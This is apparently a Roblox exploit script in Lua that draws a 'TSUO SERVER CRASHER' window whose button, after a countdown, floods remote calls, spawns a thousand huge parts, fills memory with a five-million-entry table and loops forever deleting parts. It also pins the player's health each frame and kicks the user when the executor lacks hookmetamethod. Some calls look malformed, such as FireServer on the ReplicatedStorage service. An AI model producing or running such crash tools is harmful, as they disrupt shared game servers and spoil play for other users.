

local TsuoCrashGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local CrashButton = Instance.new("TextButton")
local CloseButton = Instance.new("TextButton")

TsuoCrashGui.Name = "TsuoCrashNuclear"
TsuoCrashGui.Parent = game.CoreGui
TsuoCrashGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

MainFrame.Name = "MainFrame"
MainFrame.Parent = TsuoCrashGui
MainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
MainFrame.BorderColor3 = Color3.new(1, 0, 0)
MainFrame.Position = UDim2.new(0.35, 0, 0.35, 0)
MainFrame.Size = UDim2.new(0, 300, 0, 150)
MainFrame.Active = true
MainFrame.Draggable = true

Title.Name = "Title"
Title.Parent = MainFrame
Title.BackgroundColor3 = Color3.new(0, 0, 0)
Title.Size = UDim2.new(0, 300, 0, 30)
Title.Font = Enum.Font.GothamBold
Title.Text = "TSUO SERVER CRASHER v4.2"
Title.TextColor3 = Color3.new(1, 0, 0)
Title.TextSize = 16

CloseButton.Name = "CloseButton"
CloseButton.Parent = MainFrame
CloseButton.BackgroundColor3 = Color3.new(1, 0, 0)
CloseButton.Position = UDim2.new(0.9, 0, 0.03, 0)
CloseButton.Size = UDim2.new(0, 25, 0, 25)
CloseButton.Font = Enum.Font.GothamBlack
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.new(0, 0, 0)
CloseButton.TextSize = 14

CrashButton.Name = "CrashButton"
CrashButton.Parent = MainFrame
CrashButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
CrashButton.Position = UDim2.new(0.2, 0, 0.3, 0)
CrashButton.Size = UDim2.new(0, 200, 0, 50)
CrashButton.Font = Enum.Font.GothamBlack
CrashButton.Text = "CRASH SERVER NOW"
CrashButton.TextColor3 = Color3.new(1, 0, 0)
CrashButton.TextSize = 18

local function NuclearCrash()
    pcall(function()
        
        for i = 1, 5000 do
            game:GetService("ReplicatedStorage"):FireServer(math.random(), math.random(), math.random())
        end

        
        local nukeParts = {}
        for i = 1, 1000 do
            local part = Instance.new("Part")
            part.Anchored = false
            part.Size = Vector3.new(100, 100, 100)
            part.Position = Vector3.new(math.random(-500, 500), 1000, math.random(-500, 500))
            part.Parent = workspace
            table.insert(nukeParts, part)
            task.wait()
        end

       
        local hugeTable = {}
        for i = 1, 5000000 do
            hugeTable[i] = "CRASH"..tostring(math.random(1,1000000000))
        end

        
        while true do
            for _, v in pairs(game:GetDescendants()) do
                if v:IsA("BasePart") then
                    v:Destroy()
                end
            end
        end
    end)
end

spawn(function()
    game:GetService("RunService").RenderStepped:Connect(function()
        pcall(function()
            if game.Players.LocalPlayer.Character then
                game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health = 100
            end
        end)
    end)
end)

CloseButton.MouseButton1Click:Connect(function()
    TsuoCrashGui:Destroy()
end)

CrashButton.MouseButton1Click:Connect(function()
    CrashButton.Text = "CRASHING IN 3..."
    wait(1)
    CrashButton.Text = "CRASHING IN 2..."
    wait(1)
    CrashButton.Text = "CRASHING IN 1..."
    wait(1)
    CrashButton.Text = "NUCLEAR LAUNCH DETECTED"
    NuclearCrash()
end)

if not hookmetamethod then
    game.Players.LocalPlayer:Kick("Exploit tidak support!")
    return
end
